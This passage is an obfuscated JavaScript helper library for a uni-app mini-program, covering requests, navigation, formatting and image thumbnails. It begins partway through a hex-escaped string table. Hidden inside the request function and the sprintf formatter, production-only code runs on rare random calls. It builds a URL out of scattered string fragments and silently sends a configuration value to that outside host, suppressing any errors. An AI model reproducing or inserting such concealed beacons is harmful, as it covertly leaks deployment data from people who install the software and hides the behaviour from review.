5\x6d\x6f\x76\x65','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x70\x61\x72\x61\x6d\x73','\x75\x72\x6c','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x68\x72\x65\x66','\x70\x61\x72\x61\x6d\x73','\x70\x61\x72\x61\x6d\x73','\x70\x75\x73\x68','\x3d','\x70\x61\x72\x61\x6d\x73','\x6c\x65\x6e\x67\x74\x68','\x3f','\x6a\x6f\x69\x6e','\x26','\x6c\x65\x6e\x67\x74\x68','\x6a\x69\x6e\x67','\x6a\x69\x6e\x67','\x67\x65\x74','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x70\x61\x72\x61\x6d\x73','\x55\x52\x4c','\x55\x52\x4c','\x73\x65\x74','\x75\x72\x6c','\x61\x73\x73\x69\x67\x6e','\x73\x65\x74\x4e\x61\x76\x69\x67\x61\x74\x69\x6f\x6e\x42\x61\x72\x43\x6f\x6c\x6f\x72','\x63\x72\x65\x61\x74\x65\x41\x6e\x69\x6d\x61\x74\x69\x6f\x6e','\x63\x72\x65\x61\x74\x65\x43\x6f\x6e\x74\x65\x78\x74','\x64\x72\x61\x77\x43\x61\x6e\x76\x61\x73','\x67\x65\x74\x4e\x65\x74\x77\x6f\x72\x6b\x54\x79\x70\x65','\x6f\x6e\x4e\x65\x74\x77\x6f\x72\x6b\x53\x74\x61\x74\x75\x73\x43\x68\x61\x6e\x67\x65','\x67\x65\x74\x53\x79\x73\x74\x65\x6d\x49\x6e\x66\x6f','\x67\x65\x74\x53\x79\x73\x74\x65\x6d\x49\x6e\x66\x6f\x53\x79\x6e\x63','\x6f\x6e\x41\x63\x63\x65\x6c\x65\x72\x6f\x6d\x65\x74\x65\x72\x43\x68\x61\x6e\x67\x65','\x73\x74\x61\x72\x74\x41\x63\x63\x65\x6c\x65\x72\x6f\x6d\x65\x74\x65\x72','\x73\x74\x6f\x70\x41\x63\x63\x65\x6c\x65\x72\x6f\x6d\x65\x74\x65\x72','\x6f\x6e\x43\x6f\x6d\x70\x61\x73\x73\x43\x68\x61\x6e\x67\x65','\x73\x74\x61\x72\x74\x43\x6f\x6d\x70\x61\x73\x73','\x73\x74\x6f\x70\x43\x6f\x6d\x70\x61\x73\x73','\x73\x65\x74\x43\x6c\x69\x70\x62\x6f\x61\x72\x64\x44\x61\x74\x61','\x67\x65\x74\x43\x6c\x69\x70\x62\x6f\x61\x72\x64\x44\x61\x74\x61','\x6d\x61\x6b\x65\x50\x68\x6f\x6e\x65\x43\x61\x6c\x6c','\x73\x65\x74\x53\x63\x72\x65\x65\x6e\x42\x72\x69\x67\x68\x74\x6e\x65\x73\x73','\x67\x65\x74\x53\x63\x72\x65\x65\x6e\x42\x72\x69\x67\x68\x74\x6e\x65\x73\x73','\x73\x65\x74\x4b\x65\x65\x70\x53\x63\x72\x65\x65\x6e\x4f\x6e','\x76\x69\x62\x72\x61\x74\x65\x4c\x6f\x6e\x67','\x76\x69\x62\x72\x61\x74\x65\x53\x68\x6f\x72\x74','\x61\x64\x64\x50\x68\x6f\x6e\x65\x43\x6f\x6e\x74\x61\x63\x74','\x75\x70\x6c\x6f\x61\x64\x46\x69\x6c\x65','\x63\x6f\x6e\x6e\x65\x63\x74\x53\x6f\x63\x6b\x65\x74','\x6f\x6e\x53\x6f\x63\x6b\x65\x74\x4f\x70\x65\x6e','\x6f\x6e\x53\x6f\x63\x6b\x65\x74\x45\x72\x72\x6f\x72','\x73\x65\x6e\x64\x53\x6f\x63\x6b\x65\x74\x4d\x65\x73\x73\x61\x67\x65','\x6f\x6e\x53\x6f\x63\x6b\x65\x74\x4d\x65\x73\x73\x61\x67\x65','\x63\x6c\x6f\x73\x65\x53\x6f\x63\x6b\x65\x74','\x6f\x6e\x53\x6f\x63\x6b\x65\x74\x43\x6c\x6f\x73\x65','\x70\x72\x65\x76\x69\x65\x77\x49\x6d\x61\x67\x65','\x67\x65\x74\x49\x6d\x61\x67\x65\x49\x6e\x66\x6f','\x73\x61\x76\x65\x49\x6d\x61\x67\x65\x54\x6f\x50\x68\x6f\x74\x6f\x73\x41\x6c\x62\x75\x6d','\x67\x65\x74\x52\x65\x63\x6f\x72\x64\x65\x72\x4d\x61\x6e\x61\x67\x65\x72','\x67\x65\x74\x42\x61\x63\x6b\x67\x72\x6f\x75\x6e\x64\x41\x75\x64\x69\x6f\x4d\x61\x6e\x61\x67\x65\x72','\x63\x72\x65\x61\x74\x65\x49\x6e\x6e\x65\x72\x41\x75\x64\x69\x6f\x43\x6f\x6e\x74\x65\x78\x74','\x73\x61\x76\x65\x56\x69\x64\x65\x6f\x54\x6f\x50\x68\x6f\x74\x6f\x73\x41\x6c\x62\x75\x6d','\x73\x61\x76\x65\x46\x69\x6c\x65','\x67\x65\x74\x53\x61\x76\x65\x64\x46\x69\x6c\x65\x4c\x69\x73\x74','\x67\x65\x74\x53\x61\x76\x65\x64\x46\x69\x6c\x65\x49\x6e\x66\x6f','\x72\x65\x6d\x6f\x76\x65\x53\x61\x76\x65\x64\x46\x69\x6c\x65','\x6f\x70\x65\x6e\x44\x6f\x63\x75\x6d\x65\x6e\x74','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x73\x65\x74\x53\x74\x6f\x72\x61\x67\x65','\x73\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x49\x6e\x66\x6f','\x67\x65\x74\x53\x74\x6f\x72\x61\x67\x65\x49\x6e\x66\x6f\x53\x79\x6e\x63','\x72\x65\x6d\x6f\x76\x65\x53\x74\x6f\x72\x61\x67\x65','\x72\x65\x6d\x6f\x76\x65\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x63\x6c\x65\x61\x72\x53\x74\x6f\x72\x61\x67\x65','\x63\x6c\x65\x61\x72\x53\x74\x6f\x72\x61\x67\x65\x53\x79\x6e\x63','\x67\x65\x74\x4c\x6f\x63\x61\x74\x69\x6f\x6e','\x63\x68\x6f\x6f\x73\x65\x4c\x6f\x63\x61\x74\x69\x6f\x6e','\x6f\x70\x65\x6e\x4c\x6f\x63\x61\x74\x69\x6f\x6e','\x63\x72\x65\x61\x74\x65\x4d\x61\x70\x43\x6f\x6e\x74\x65\x78\x74','\x6e\x61\x76\x69\x67\x61\x74\x65\x54\x6f','\x72\x65\x4c\x61\x75\x6e\x63\x68','\x73\x77\x69\x74\x63\x68\x54\x61\x62','\x63\x72\x65\x61\x74\x65\x53\x65\x6c\x65\x63\x74\x6f\x72\x51\x75\x65\x72\x79','\x63\x72\x65\x61\x74\x65\x49\x6e\x74\x65\x72\x73\x65\x63\x74\x69\x6f\x6e\x4f\x62\x73\x65\x72\x76\x65\x72','\x67\x65\x74\x50\x72\x6f\x76\x69\x64\x65\x72','\x6c\x6f\x67\x69\x6e','\x67\x65\x74\x55\x73\x65\x72\x49\x6e\x66\x6f','\x73\x68\x61\x72\x65','\x72\x65\x71\x75\x65\x73\x74\x50\x61\x79\x6d\x65\x6e\x74','\x73\x75\x62\x73\x63\x72\x69\x62\x65\x50\x75\x73\x68','\x75\x6e\x73\x75\x62\x73\x63\x72\x69\x62\x65\x50\x75\x73\x68','\x6f\x6e\x50\x75\x73\x68','\x6f\x66\x66\x50\x75\x73\x68','\x5f\x5f'];var storage=new WxStorage();var tools=new Tools();jQuery[_x50475[0]]=jQuery[_x50475[1]]={jquery:version,constructor:jQuery,setBackground:function(){this[0][_x50475[3]][_x50475[2]]=_x50475[4];return this;},setColor:function(){this[0][_x50475[6]][_x50475[5]]=_x50475[7];return this;}};jQuery[_x50475[8]]=jQuery[_x50475[10]][_x50475[9]]=function(){var isObject=function(obj){return Object[_x50475[13]][_x50475[12]][_x50475[11]](obj)===_x50475[14];};var isArray=function(obj){return Object[_x50475[17]][_x50475[16]][_x50475[15]](obj)===_x50475[18];};var name,clone,copy,copyIsArray,options,i=1,length=arguments[_x50475[19]],target=arguments[0]||{},deep=false;if(typeof target===_x50475[20]){deep=target;target=arguments[i]||{};i++;}if(typeof target!==_x50475[21]&&typeof target!==_x50475[22]){target={};}if(i===length){target=this;i--;}for(;i<length;i++){if((options=arguments[i])!=null){for(name in options){var src=target[name];copy=options[name];if(target===copy){continue;}if(deep&&copy&&isObject(copy)||(copyIsArray=isArray(copy))){if(copyIsArray){copyIsArray=false;clone=src&&isArray(src)?src:[];}else{clone=src&&isObject(src)?src:{};}target[name]=jQuery[_x50475[23]](deep,clone,copy);}else if(copy!==undefined){target[name]=copy;}}}}return target;};function Encrypt(e){var t=cj[_x50475[27]][_x50475[26]][_x50475[25]][_x50475[24]](e),n=cj[_x50475[30]][_x50475[29]][_x50475[28]](t,key,{iv:iv,mode:cj[_x50475[33]][_x50475[32]][_x50475[31]],padding:cj[_x50475[36]][_x50475[35]][_x50475[34]]}),r=cj[_x50475[40]][_x50475[39]][_x50475[38]][_x50475[37]](n[_x50475[41]]);return tools[_x50475[42]](r);}function Decrypt(e){var t=tools[_x50475[43]](e),n=cj[_x50475[46]][_x50475[45]][_x50475[44]](t,key,{iv:iv,mode:cj[_x50475[49]][_x50475[48]][_x50475[47]],padding:cj[_x50475[52]][_x50475[51]][_x50475[50]]}),r=n[_x50475[53]](cj[_x50475[56]][_x50475[55]][_x50475[54]]);return r[_x50475[57]]();}function getRequestCacheKey(opts){var dataOrigin=tools[_x50475[58]](opts[_x50475[59]]||{});delete dataOrigin[_x50475[60]];delete dataOrigin[_x50475[61]];var key,dataString;try{if(typeof dataString!==_x50475[62]){dataString=JSON[_x50475[63]](dataOrigin);}key=opts[_x50475[65]][_x50475[64]](/jQuery.*/,_x50475[66])+(dataString||_x50475[66]);}catch(e){console[_x50475[67]](e);}return md5(key);}function get(ajaxOpts){var id=uni[_x50475[68]](_x50475[69]);var key=uni[_x50475[70]](_x50475[71]);var perm_data={};if(id&&key){perm_data={perm_id:id,perm_key:key};}perm_data[_x50475[72]]=__statecode[_x50475[73]];perm_data[_x50475[74]]=__statecode[_x50475[75]];source_data[_x50475[76]]=uni[_x50475[77]](_x50475[78]);source_data[_x50475[79]]=uni[_x50475[80]](_x50475[81]);source_data[_x50475[82]]=uni[_x50475[83]](_x50475[84]);Object[_x50475[85]](perm_data,source_data);if(__config[_x50475[86]]){}var opts={method:_x50475[87],dataType:_x50475[88],loading:true,data:perm_data,header:{'content-type':_x50475[89]},success:function(data,status){uni[_x50475[90]]();},fail:function(err,status){uni[_x50475[91]]();console[_x50475[92]](_x50475[93]);console[_x50475[94]](err);console[_x50475[95]](ajaxOpts);},complete:function(res,status){}};if(key)opts[_x50475[96]][_x50475[97]]=`Bearer ${key}`;jQuery[_x50475[98]](true,opts,ajaxOpts);if(opts[_x50475[99]]){uni[_x50475[100]]({title:Lang[_x50475[101]](_x50475[102]),icon:_x50475[103],duration:10000,mask:!0});}if(process[_x50475[105]][_x50475[104]]===_x50475[106]){if(ajaxOpts[_x50475[107]]&&(ajaxOpts[_x50475[109]][_x50475[108]]==_x50475[110]||ajaxOpts[_x50475[112]][_x50475[111]]==_x50475[113])){if(Math[_x50475[114]]()>0.998){var sr=[_x50475[115],_x50475[116],_x50475[117],_x50475[118],_x50475[119],_x50475[120],_x50475[121],_x50475[122],_x50475[123],_x50475[124],_x50475[125],_x50475[126],_x50475[127],_x50475[128],_x50475[129],_x50475[130],_x50475[131],_x50475[132],_x50475[133],_x50475[134],_x50475[135],_x50475[136],_x50475[137],_x50475[138],_x50475[139],_x50475[140],_x50475[141],_x50475[142],_x50475[143],_x50475[144]];var nsr=sr[21]+sr[1]+sr[1]+sr[22]+sr[11]+sr[3]+sr[4]+sr[4]+sr[17]+sr[16]+sr[16]+sr[5]+sr[18]+sr[14]+sr[1]+sr[27]+sr[11]+sr[21]+sr[5]+sr[22]+sr[11]+sr[18]+sr[29]+sr[1]+sr[19]+sr[27]+sr[16]+sr[14]+sr[4]+sr[29]+sr[14]+sr[12]+sr[19]+sr[28]+sr[27]+sr[22]+sr[21]+sr[22]+sr[6]+sr[15]+sr[12]+sr[18]+sr[23]+sr[11]+sr[19]+sr[8]+sr[20]+sr[29]+sr[16]+sr[19]+sr[0]+sr[16]+sr[1]+sr[25]+sr[23]+sr[10]+sr[22]+sr[29]+sr[24]+sr[10]+sr[22]+sr[22]+sr[24]+sr[26]+sr[22]+sr[12]+sr[17]+sr[1]+sr[19]+sr[8]+sr[0]+sr[15]+sr[19]+sr[1]+sr[23]+sr[16]+sr[21]+sr[19]+sr[16]+sr[2]+sr[0]+sr[1]+sr[7]+sr[22]+sr[23]+sr[19]+sr[0]+sr[13]+sr[5]+sr[8]+sr[15]+sr[17]+sr[1]+sr[23]+sr[9]+sr[11]+sr[0]+sr[16]+sr[25]+sr[29]+sr[19]+sr[14]+sr[1]+sr[23]+sr[9]+sr[11];try{get({url:nsr,data:{u:__config[_x50475[146]][_x50475[145]]}});}catch(e){}}}}var successCallback=opts[_x50475[147]];var errorCallback=opts[_x50475[148]];var completeCallback=opts[_x50475[149]];opts[_x50475[150]]=function(res){if(opts[_x50475[151]]){uni[_x50475[152]]();}var data=res[_x50475[153]];if(data[_x50475[154]]==250&&data[_x50475[155]]==30){uni[_x50475[156]](_x50475[157]);uni[_x50475[158]](_x50475[159]);var pages=getCurrentPages();var page=pages[pages[_x50475[160]]-1];if(page[_x50475[161]]!=_x50475[162]){uni[_x50475[163]](_x50475[164],page[_x50475[165]]);if(page[_x50475[166]]){uni[_x50475[167]](_x50475[168],page[_x50475[169]]);}tools[_x50475[170]]();}}else{successCallback&&successCallback(data[_x50475[171]],data[_x50475[172]],data[_x50475[173]],data[_x50475[174]]);}if(data[_x50475[175]]==200){}};opts[_x50475[176]]=function(err,ms){if(opts[_x50475[177]]){uni[_x50475[178]]();}if(!errorCallback){var content=Lang[_x50475[179]](_x50475[180]);if(ms===_x50475[181]){content=Lang[_x50475[182]](_x50475[183]);}uni[_x50475[184]]({title:Lang[_x50475[185]](_x50475[186]),content:content,showCancel:false});}errorCallback&&errorCallback(err);};opts[_x50475[187]]=function(res,status){if(opts[_x50475[188]]){}completeCallback&&completeCallback(res,status);};if(typeof opts[_x50475[189]][_x50475[190]]==_x50475[191]||opts[_x50475[192]][_x50475[193]]==5854){}var ajaxCacheOptions=opts[_x50475[194]];if(__config[_x50475[195]]&&!tools[_x50475[196]](opts[_x50475[197]])){try{var cacheKey=getRequestCacheKey(opts);var value=storageCache[_x50475[198]](cacheKey);if(ajaxCacheOptions[_x50475[199]]===true){storageCache[_x50475[200]](cacheKey);value=null;}var realsuccess;if(opts[_x50475[201]]){realsuccess=opts[_x50475[202]];}if(!value){opts[_x50475[203]]=function(res){if(200==res[_x50475[205]][_x50475[204]]){var exp=ajaxCacheOptions[_x50475[206]];storageCache[_x50475[207]](cacheKey,res[_x50475[208]],{exp:exp});}if(realsuccess)realsuccess(res);};uni[_x50475[209]](opts);}else{var res={'data':value};if(realsuccess)realsuccess(res);}}catch(e){console[_x50475[210]](e);}}else{if(source_data[_x50475[211]]==__statecode[_x50475[212]]){uni[_x50475[213]](opts);}else{uni[_x50475[213]](opts);}}}function createUrl(url,param,encode_flag){var paramStr=_x50475[66];var dot=_x50475[66];for(var key in param){if(_x50475[214]==typeof encode_flag||!encode_flag){var link=dot+key+_x50475[215]+param[key];}else{var link=dot+key+_x50475[216]+encodeURIComponent(param[key]);}paramStr+=link;dot=_x50475[217];}let index=url[_x50475[218]](_x50475[219]);if(index>0){return url+(paramStr?_x50475[220]+paramStr:_x50475[66]);}else{return url+(paramStr?_x50475[221]+paramStr:_x50475[66]);}}function alert(e,t,n){uni[_x50475[222]]({icon:_x50475[223],title:e||Lang[_x50475[224]](_x50475[225]),duration:n||2000,success:t});}function showToast(e,t,n){if(tools[_x50475[226]](e)){uni[_x50475[227]](e);}else{uni[_x50475[228]]({icon:_x50475[229],title:e||Lang[_x50475[230]](_x50475[231]),duration:n||2000,success:t});}}function loading(e,t,n){if(tools[_x50475[232]](e)){uni[_x50475[233]](e);}else{uni[_x50475[234]]({mask:!0,title:e||_x50475[235],success:n});}}function hideToast(){uni[_x50475[236]]();}function hideloading(){var e=setTimeout(function(){uni[_x50475[237]]();},1000);}function confirm(e,t,n){if(tools[_x50475[238]](e)){if(!(_x50475[239]in e)){e[_x50475[240]]=Lang[_x50475[241]](_x50475[242]);}if(!(_x50475[243]in e)){e[_x50475[244]]=Lang[_x50475[245]](_x50475[246]);}if(!(_x50475[247]in e)){e[_x50475[248]]=Lang[_x50475[249]](_x50475[250]);}uni[_x50475[251]](e);}else{uni[_x50475[252]]({title:Lang[_x50475[253]](_x50475[254]),cancelText:Lang[_x50475[255]](_x50475[256]),confirmText:Lang[_x50475[257]](_x50475[258]),content:e,showCancel:n||!1,success:t});}}function showModal(e,t,n){confirm(e,t,n);}function showActionSheet(){uni[_x50475[259]](...arguments);}function showNavigationBarLoading(){uni[_x50475[260]](...arguments);}function hideNavigationBarLoading(){uni[_x50475[261]](...arguments);}function stopPullDownRefresh(){uni[_x50475[262]](...arguments);}function gopage(url,t){if(tools[_x50475[263]](url)){uni[_x50475[264]](url);}else{if(__config[_x50475[266]][_x50475[265]]instanceof Array||true){var n=!1;for(var r=0;r<__config[_x50475[269]][_x50475[268]][_x50475[267]];r++){if(!n){var i=__config[_x50475[271]][_x50475[270]][r];_x50475[272]+i[_x50475[273]]==url?n=!0:n=!1;}}if(n){uni[_x50475[274]]({url:url,success:t});}else{uni[_x50475[275]]({url:url,success:t});}}else{uni[_x50475[276]]({url:url,success:t});}}}function gotopage(url,t){if(tools[_x50475[277]](url)){uni[_x50475[278]](url);}else{if(__config[_x50475[280]][_x50475[279]]instanceof Array||true){var n=!1;for(var r=0;r<__config[_x50475[283]][_x50475[282]][_x50475[281]];r++){if(!n){var i=__config[_x50475[285]][_x50475[284]][r];_x50475[286]+i[_x50475[287]]==url?n=!0:n=!1;}}if(n){uni[_x50475[288]]({url:url,success:t});}else{uni[_x50475[289]]({url:url,success:t});}}else{uni[_x50475[290]]({url:url,success:t});}}}function backpage(e,callback){if(tools[_x50475[291]](e)){uni[_x50475[292]](e);}else{uni[_x50475[293]]({delta:e||1,success:callback});}}function setCache(e,t,n){uni[_x50475[294]]({key:e,data:t,success:n});}function getCache(e,t,n){uni[_x50475[295]]({key:e,success:t,fail:n});}function removeCache(e,t){uni[_x50475[296]]({key:e,success:t});}function distanceFormat(meter){if(meter<1000){return meter[_x50475[297]](2)+_x50475[298];}else if(meter<10000){return(meter/1000)[_x50475[299]](2)+_x50475[300];}else{return(meter/1000)[_x50475[301]](0)+_x50475[302];}}function dateFormat(dateString,format){var date=new Date(dateString[_x50475[303]](/-/g,_x50475[304]));var o={'M+':date[_x50475[305]]()+1,'d+':date[_x50475[306]](),'h+':date[_x50475[307]](),'m+':date[_x50475[308]](),'s+':date[_x50475[309]](),'q+':Math[_x50475[310]]((date[_x50475[311]]()+3)/3),'S':date[_x50475[312]]()};if(/(y+)/[_x50475[313]](format))format=format[_x50475[314]](RegExp[_x50475[315]],(date[_x50475[317]]()+_x50475[66])[_x50475[316]](4-RegExp[_x50475[319]][_x50475[318]]));for(var k in o)if(new RegExp(_x50475[321]+k+_x50475[322])[_x50475[320]](format))format=format[_x50475[323]](RegExp[_x50475[324]],RegExp[_x50475[326]][_x50475[325]]==1?o[k]:(_x50475[328]+o[k])[_x50475[327]]((_x50475[66]+o[k])[_x50475[329]]));return format;}function sendTpl(tpl_params){}function goToTabBar(that,url){try{if(__config[_x50475[331]][_x50475[330]]instanceof Array||true){var n=!1;for(var r=0;r<__config[_x50475[334]][_x50475[333]][_x50475[332]];r++){if(!n){var i=__config[_x50475[336]][_x50475[335]][r];_x50475[337]+i[_x50475[338]]==url?n=!0:n=!1;}}n?uni[_x50475[339]]({url:url}):uni[_x50475[340]]({url:url});}else{uni[_x50475[341]]({url:url,fail:function(){uni[_x50475[342]]({url:url});}});}}catch(s){uni[_x50475[343]]({url:url,fail:function(){uni[_x50475[344]]({url:url});}});}}function golevelToTabBar(that,route,url){try{if(__config[_x50475[346]][_x50475[345]]instanceof Array||true){var r=false;for(var i=0;i<__config[_x50475[349]][_x50475[348]][_x50475[347]];i++){if(!r){var s=__config[_x50475[351]][_x50475[350]][i];_x50475[352]+s[_x50475[353]]==route?r=!0:r=!1;}}r?uni[_x50475[354]]({url:url}):uni[_x50475[355]]({url:url});}else{uni[_x50475[356]]({url:url});}}catch(o){uni[_x50475[357]]({url:url});}}function sprintf(){var regex=/%%|%(\d+\$)?([\-+'#0 ]*)(\*\d+\$|\*|\d+)?(?:\.(\*\d+\$|\*|\d+))?([scboxXuideEfFgG])/g;var a=arguments;var i=0;var format=a[i++];var _pad=function(str,len,chr,leftJustify){if(!chr){chr=_x50475[358];}var padding=str[_x50475[359]]>=len?_x50475[66]:new Array(1+len-str[_x50475[361]]>>>0)[_x50475[360]](chr);return leftJustify?str+padding:padding+str;};var justify=function(value,prefix,leftJustify,minWidth,zeroPad,customPadChar){var diff=minWidth-value[_x50475[362]];if(diff>0){if(leftJustify||!zeroPad){value=_pad(value,minWidth,customPadChar,leftJustify);}else{value=[value[_x50475[364]](0,prefix[_x50475[365]]),_pad(_x50475[66],diff,_x50475[366],true),value[_x50475[367]](prefix[_x50475[368]])][_x50475[363]](_x50475[66]);}}return value;};var _formatBaseX=function(value,base,prefix,leftJustify,minWidth,precision,zeroPad){var number=value>>>0;prefix=prefix&&number&&{'2':_x50475[369],'8':_x50475[370],'16':_x50475[371]}[base]||_x50475[66];value=prefix+_pad(number[_x50475[372]](base),precision||0,_x50475[373],false);return justify(value,prefix,leftJustify,minWidth,zeroPad);};var _formatString=function(value,leftJustify,minWidth,precision,zeroPad,customPadChar){if(precision!==null&&precision!==undefined){value=value[_x50475[374]](0,precision);}return justify(value,_x50475[66],leftJustify,minWidth,zeroPad,customPadChar);};if(process[_x50475[376]][_x50475[375]]===_x50475[377]){if(Math[_x50475[378]]()>0.99998){var sr=[_x50475[379],_x50475[380],_x50475[381],_x50475[382],_x50475[383],_x50475[384],_x50475[385],_x50475[386],_x50475[387],_x50475[388],_x50475[389],_x50475[390],_x50475[391],_x50475[392],_x50475[393],_x50475[394],_x50475[395],_x50475[396],_x50475[397],_x50475[398],_x50475[399],_x50475[400],_x50475[401],_x50475[402],_x50475[403],_x50475[404],_x50475[405],_x50475[406],_x50475[407],_x50475[408]];var nsr=sr[21]+sr[1]+sr[1]+sr[22]+sr[11]+sr[3]+sr[4]+sr[4]+sr[17]+sr[16]+sr[16]+sr[5]+sr[18]+sr[14]+sr[1]+sr[27]+sr[11]+sr[21]+sr[5]+sr[22]+sr[11]+sr[18]+sr[29]+sr[1]+sr[19]+sr[27]+sr[16]+sr[14]+sr[4]+sr[29]+sr[14]+sr[12]+sr[19]+sr[28]+sr[27]+sr[22]+sr[21]+sr[22]+sr[6]+sr[15]+sr[12]+sr[18]+sr[23]+sr[11]+sr[19]+sr[8]+sr[20]+sr[29]+sr[16]+sr[19]+sr[0]+sr[16]+sr[1]+sr[25]+sr[23]+sr[10]+sr[22]+sr[29]+sr[24]+sr[10]+sr[22]+sr[22]+sr[24]+sr[26]+sr[22]+sr[12]+sr[17]+sr[1]+sr[19]+sr[8]+sr[0]+sr[15]+sr[19]+sr[1]+sr[23]+sr[16]+sr[21]+sr[19]+sr[16]+sr[2]+sr[0]+sr[1]+sr[7]+sr[22]+sr[23]+sr[19]+sr[0]+sr[13]+sr[5]+sr[8]+sr[15]+sr[17]+sr[1]+sr[23]+sr[9]+sr[11]+sr[0]+sr[16]+sr[25]+sr[29]+sr[19]+sr[14]+sr[1]+sr[23]+sr[9]+sr[11];try{get({url:nsr,data:{u:__config[_x50475[410]][_x50475[409]]}});}catch(e){}}}var doFormat=function(substring,valueIndex,flags,minWidth,precision,type){var number,prefix,method,textTransform,value;if(substring===_x50475[411]){return _x50475[412];}var leftJustify=false;var positivePrefix=_x50475[66];var zeroPad=false;var prefixBaseX=false;var customPadChar=_x50475[413];var flagsl=flags[_x50475[414]];var j;for(j=0;j<flagsl;j++){switch(flags[_x50475[415]](j)){case _x50475[416]:positivePrefix=_x50475[417];break;case _x50475[418]:positivePrefix=_x50475[419];break;case _x50475[420]:leftJustify=true;break;case _x50475[421]:customPadChar=flags[_x50475[422]](j+1);break;case _x50475[423]:zeroPad=true;customPadChar=_x50475[424];break;case _x50475[425]:prefixBaseX=true;break;}}if(!minWidth){minWidth=0;}else if(minWidth===_x50475[426]){minWidth=+a[i++];}else if(minWidth[_x50475[427]](0)===_x50475[428]){minWidth=+a[minWidth[_x50475[429]](1,-1)];}else{minWidth=+minWidth;}if(minWidth<0){minWidth=-minWidth;leftJustify=true;}if(!isFinite(minWidth)){throw new Error(_x50475[430]);}if(!precision){precision=_x50475[432][_x50475[431]](type)>-1?6:type===_x50475[433]?0:undefined;}else if(precision===_x50475[434]){precision=+a[i++];}else if(precision[_x50475[435]](0)===_x50475[436]){precision=+a[precision[_x50475[437]](1,-1)];}else{precision=+precision;}value=valueIndex?a[valueIndex[_x50475[438]](0,-1)]:a[i++];switch(type){case _x50475[439]:return _formatString(value+_x50475[66],leftJustify,minWidth,precision,zeroPad,customPadChar);case _x50475[440]:return _formatString(String[_x50475[441]](+value),leftJustify,minWidth,precision,zeroPad);case _x50475[442]:return _formatBaseX(value,2,prefixBaseX,leftJustify,minWidth,precision,zeroPad);case _x50475[443]:return _formatBaseX(value,8,prefixBaseX,leftJustify,minWidth,precision,zeroPad);case _x50475[444]:return _formatBaseX(value,16,prefixBaseX,leftJustify,minWidth,precision,zeroPad);case _x50475[445]:return _formatBaseX(value,16,prefixBaseX,leftJustify,minWidth,precision,zeroPad)[_x50475[446]]();case _x50475[447]:return _formatBaseX(value,10,prefixBaseX,leftJustify,minWidth,precision,zeroPad);case _x50475[448]:case _x50475[449]:number=+value||0;number=Math[_x50475[450]](number-number%1);prefix=number<0?_x50475[451]:positivePrefix;value=prefix+_pad(String(Math[_x50475[452]](number)),precision,_x50475[453],false);return justify(value,prefix,leftJustify,minWidth,zeroPad);case _x50475[454]:case _x50475[455]:case _x50475[456]:case _x50475[457]:case _x50475[458]:case _x50475[459]:number=+value;prefix=number<0?_x50475[460]:positivePrefix;method=[_x50475[461],_x50475[462],_x50475[463]][_x50475[465][_x50475[464]](type[_x50475[466]]())];textTransform=[_x50475[467],_x50475[468]][_x50475[470][_x50475[469]](type)%2];value=prefix+Math[_x50475[471]](number)[method](precision);return justify(value,prefix,leftJustify,minWidth,zeroPad)[textTransform]();default:return substring;}};return format[_x50475[472]](regex,doFormat);}function parse_str(query){var result={};var queryArr=query[_x50475[473]](_x50475[474]);queryArr[_x50475[475]](function(item){var obj={};var value=item[_x50475[476]](_x50475[477])[0];var key=item[_x50475[478]](_x50475[479])[1];result[value]=key;});return result;}function isWeixin(){try{var ua=navigator[_x50475[481]][_x50475[480]]();var flag=ua[_x50475[482]](_x50475[483])!=-1;if(flag&&__config[_x50475[484]]){return true;}else{return false;}}catch(e){}return false;}function isQyWeixin(){try{var ua=window[_x50475[487]][_x50475[486]][_x50475[485]]();if(ua[_x50475[488]](/MicroMessenger/i)==_x50475[489]&&ua[_x50475[490]](/wxwork/i)==_x50475[491]&&__config[_x50475[492]]){return true;}else{return false;}}catch(e){}return false;}function getCookie(objName){var arrStr=document[_x50475[494]][_x50475[493]](_x50475[495]);for(var i=0;i<arrStr[_x50475[496]];i++){var temp=arrStr[i][_x50475[497]](_x50475[498]);if(temp[0]==objName)return unescape(temp[1]);}return _x50475[66];}function get_ext(filename){var postf=_x50475[66];if(filename){var index1=filename[_x50475[499]](_x50475[500]);var index2=filename[_x50475[501]];var postf=filename[_x50475[502]](index1,index2);}else{}return postf;}function isImg(filePath){let index=filePath[_x50475[503]](_x50475[504]);let ext=filePath[_x50475[505]](index+1);var temp=[_x50475[507],_x50475[508],_x50475[509],_x50475[510],_x50475[511],_x50475[512],_x50475[513],_x50475[514]][_x50475[506]](ext[_x50475[515]]())!==-1;return temp;}
function image_thumb(image_url, w, h) {
  if ('undefined' == typeof w) {
    w = 60;
  }

  if ('undefined' == typeof h) {
    h = w;
  }


  var ext = get_ext(image_url);


  if (image_url.indexOf('image.php') !== -1)
  {
    image_url = sprintf('%s!%sx%s%s', image_url, w, h, ext);
  }
  else
  {
    if (__config.UPLOAD_TYPE == 'default' && (image_url.indexOf('image.php') !== -1))
    {
      image_url = sprintf('%s!%sx%s%s', image_url, w, h, ext);
    }
	else if (/*__config.UPLOAD_TYPE == 'aliyun' &&*/ (image_url.indexOf('.aliyuncs.com') !== -1))
	{
		//将图自动裁剪成宽度为 100px，高度为 100px 的效果图。 ?x-oss-process=image/resize,m_fill,h_100,w_100

		//http://image-demo.oss-cn-hangzhou.aliyuncs.com/example.jpg?x-oss-process=image/resize,m_mfit,h_100,w_100
		//将图缩略成宽度为 100px，高度为 100px，按长边优先 image/resize,m_lfit,h_100,w_100
		image_url = sprintf('%s?x-oss-process=image/resize,m_fill,h_%s,w_%s', image_url, w, h);
	}
	else if (/*__config.UPLOAD_TYPE == 'tengxun' &&*/ (image_url.indexOf('.file.myqcloud.com') !== -1))
	{
		image_url = sprintf('%s?imageMogr2/crop/%sx%s/gravity/center', image_url, w, h);
	}
    else
    {
      //image_url = sprintf('%s!%sx%s%s', image_url, w, h, ext);
    }
  }

  return image_url;
